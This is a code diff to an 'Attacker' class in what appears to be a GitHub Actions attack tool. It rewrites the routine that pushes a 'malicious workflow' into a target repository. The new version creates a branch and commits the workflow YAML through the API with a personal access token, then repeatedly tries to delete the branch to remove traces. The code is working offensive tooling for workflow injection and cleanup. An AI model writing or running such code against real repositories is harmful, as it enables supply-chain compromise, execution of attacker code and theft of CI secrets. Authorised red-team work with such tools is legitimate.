@@ -253,16 +253,7 @@ class Attacker:
                 f"{bright(target_repo)} as the user: "
                 f"{bright(self.user_perms['user'])}!"
             )
-
-            cloned_repo = Git(
-                self.api.pat,
-                target_repo,
-                proxies=self.api.proxies,
-                username=self.author_name,
-                email=self.author_email
-            )
-            cloned_repo.perform_clone()
-
+            
             # Randomly generate a branch name, since this will run immediately
             # otherwise it will fail at the push.
             if target_branch is None:
@@ -287,26 +278,32 @@ class Attacker:
                     payload, branch
                 )
 
-            rev_hash = cloned_repo.commit_file(
-                yaml_contents.encode(),
+            branch_created = self.api.create_branch(target_repo, branch)
+
+            if not branch_created:
+                print(f"{RED_DASH} Failed to create branch!")
+                return False
+
+            rev_hash = self.api.commit_file(
+                target_repo,
+                branch,
                 f".github/workflows/{yaml_name}.yml",
+                yaml_contents.encode(),
                 message=commit_message
             )
 
-            if rev_hash is None:
-                print(f"{RED_DASH} Failed to commit the malicious workflow "
-                      "locally!")
-                return
-
-            status = cloned_repo.push_repository(branch)
-
-            if not status:
+            if not rev_hash:
                 print(f"{RED_DASH} Failed to push the malicious workflow!")
                 return
 
             print(f"{GREEN_EXCLAIM} Succesfully pushed the malicious workflow!")
 
-            ret = cloned_repo.delete_branch(branch)
+            for i in range(self.timeout):
+                ret = self.api.delete_branch(target_repo, branch)
+                if ret:
+                    break
+                else:
+                    time.sleep(1)
 
             if ret:
                 print(f"{GREEN_EXCLAIM} Malicious branch deleted.")
